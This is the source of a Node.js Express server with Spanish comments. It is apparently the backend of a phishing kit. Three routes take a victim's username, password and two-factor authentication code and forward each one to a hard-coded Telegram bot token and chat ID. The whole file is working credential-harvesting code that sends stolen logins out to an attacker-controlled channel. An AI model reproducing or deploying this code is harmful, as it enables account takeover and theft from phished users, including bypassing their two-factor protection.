// Requerir las dependencias necesarias
const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path'); // Para manejar rutas de archivos

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Para servir archivos estáticos (HTML, CSS, JS)

// Objeto para almacenar datos por dispositivo
let usuariosData = {};

// Ruta para servir el archivo index.html en la raíz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Ruta para recibir y enviar el nombre de usuario al bot de Telegram
app.post('/send-user', async (req, res) => {
    const { dispositivoID, texto: usuario } = req.body;

    // Almacenar el usuario por dispositivo
    if (!usuariosData[dispositivoID]) {
        usuariosData[dispositivoID] = { usuario: null, contraseña: null, codigo: null };
    }
    usuariosData[dispositivoID].usuario = `Usuario ${dispositivoID}: ${usuario}`;

    await fetch(`https://api.telegram.org/bot7742219599:AAEJ6IswFQ0LKK5LoXHAiSw-Vr13CyJ4C-I/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '7891046852',
            text: usuariosData[dispositivoID].usuario,
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Ruta para recibir y enviar la contraseña al bot de Telegram
app.post('/send-password', async (req, res) => {
    const { dispositivoID, texto: password } = req.body;

    // Almacenar la contraseña por dispositivo
    if (usuariosData[dispositivoID]) {
        usuariosData[dispositivoID].contraseña = `Contraseña ${dispositivoID}: ${password}`;
    }

    await fetch(`https://api.telegram.org/bot7742219599:AAEJ6IswFQ0LKK5LoXHAiSw-Vr13CyJ4C-I/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '7891046852',
            text: usuariosData[dispositivoID].contraseña,
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Ruta para recibir y enviar el código de autenticación al bot de Telegram
app.post('/send-auth', async (req, res) => {
    const { dispositivoID, texto: authCode } = req.body;

    // Almacenar el código de autenticación por dispositivo
    if (usuariosData[dispositivoID]) {
        usuariosData[dispositivoID].codigo = `Autenticación ${dispositivoID}: ${authCode}`;
    }

    await fetch(`https://api.telegram.org/bot7742219599:AAEJ6IswFQ0LKK5LoXHAiSw-Vr13CyJ4C-I/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '7891046852',
            text: usuariosData[dispositivoID].codigo,
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Inicia el servidor en el puerto especificado
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});